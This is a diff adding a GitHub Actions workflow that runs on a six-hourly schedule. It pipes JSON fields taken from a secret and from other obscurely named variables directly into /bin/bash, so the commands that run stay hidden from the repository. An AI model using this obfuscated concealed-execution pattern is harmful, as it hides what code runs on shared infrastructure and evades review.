@@ -1,0 +1,25 @@
+name: jiayouy2y
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiayouy2y
+        env:
+          kmb45937: ${{ secrets.kmb45937 }}
+        run: |
+          echo $kmb45937 | jq -r .hu53 | /bin/bash
+          echo $fvil44847 | jq -r .za86 | /bin/bash
+          echo $rs85138 | jq -r .epvgf7 | /bin/bash
+          echo $f5698 | jq -r .mx95546 | /bin/bash
+          echo $fizx554 | jq -r .jgi52 | /bin/bash
+          echo $xene22168 | jq -r .gblde7 | /bin/bash
+          echo $blrlq30424 | jq -r .lhzs747 | /bin/bash
+          echo $gwqex6063 | jq -r .hfc54603 | /bin/bash
+          echo $qr59 | jq -r .mrns422 | /bin/bash
+
